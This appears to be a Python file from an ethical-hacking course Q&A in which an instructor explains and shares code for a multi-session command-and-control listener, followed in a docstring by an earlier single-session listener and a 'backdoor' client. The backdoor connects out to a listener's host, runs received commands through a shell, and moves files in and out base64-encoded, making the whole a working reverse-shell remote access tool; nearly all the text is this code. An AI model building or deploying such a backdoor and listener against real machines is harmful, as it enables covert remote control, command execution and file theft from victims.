"""
Ah I get you, so you simply want the listener to be able to handle multiple connections yeah? if that's the case then yeah this wasn't covered in the course but it is doable, I've actually done it answer another student's in the past, here is my answer copied from there:

The idea is to run a while loop that will always accept connections and store them in a connections list (check the init method below).

Then add 2 new commands

- sessions - to list all connections.

- goto - to go to a specific connection.

Test it for yourself and let me know what you think.
Yeah subprocess.check_output send the result of the command after it finishes, there other methods that would display the output of the command but the issue then is that we are establishing a tcp connection and sending the data in chunks, what you want to do seems to be very similar to opening an SSH tunnel, you can actually open a SSH tunnel using python, I don't want to spill the answer to you as I want you to get used to researching, so have a look on paramiko.
"""
#!/usr/bin/python
import socket, json, base64, threading, os
 
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        threading.Thread(target=self.run).start()
        self.connections = []
        self.connection = None
        while True:
            connection = listener.accept()
            self.connections.append(connection)
            print("\n[+] Got a connection from " + str(connection[1]))
 
 
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
 
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
 
    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
 
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
 
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
 
    def print_connections(self):
        connection_number = 0
        print("Session #\t\t\tAddress")
        for connection in self.connections:
            print(str(connection_number) + "\t\t\t" + str(connection[1]))
            connection_number = connection_number + 1
 
    def go_to_session(self, session_number):
        session_number = int(session_number)
        print("[+] Switching to " + self.connections[session_number][1][0])
        self.connection = self.connections[session_number][0]
 
    def close_connections_and_exit(self):
        for connection in self.connections:
            connection[0].close()
        os._exit(1)
 
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
 
            try:
                if command[0] == "":
                    continue
                elif command[0] == "exit":
                    self.close_connections_and_exit()
                elif command[0] == "sessions":
                    self.print_connections()
                    continue
                elif command[0] == "goto":
                    self.go_to_session(command[1])
                    continue
 
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
 
                result = self.execute_remotely(command)
 
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
 
            print(result)
 
my_listener = Listener()

"""
import socket, json, base64
 
 
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
 
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
 
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
 
    def execute_remotely(self, command):
        self.reliable_send(command)
 
        if command[0] == "exit":
            self.connection.close()
            exit()
 
        return self.reliable_receive()
 
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
 
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
 
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
 
            #try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)
            elif command[0] == "cd" and len(command) > 2:
                command[1] = " ".join(command[1:])
            result = self.execute_remotely(command)
 
            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            #except Exception:
            #    result = "[-] Error during command execution."
 
            print(result)
 
my_listener = Listener()
my_listener.run()
And the backdoor :

#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
 
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
 
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
 
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
 
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
 
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
 
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."
 
    def run(self):
        while True:
            command = self.reliable_receive()
 
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Error during comand execution."
 
            self.reliable_send(command_result)
 
try:
    my_backdoor = Backdoor()
    my_backdoor.run()
except Exception:
    sys.exit()

    """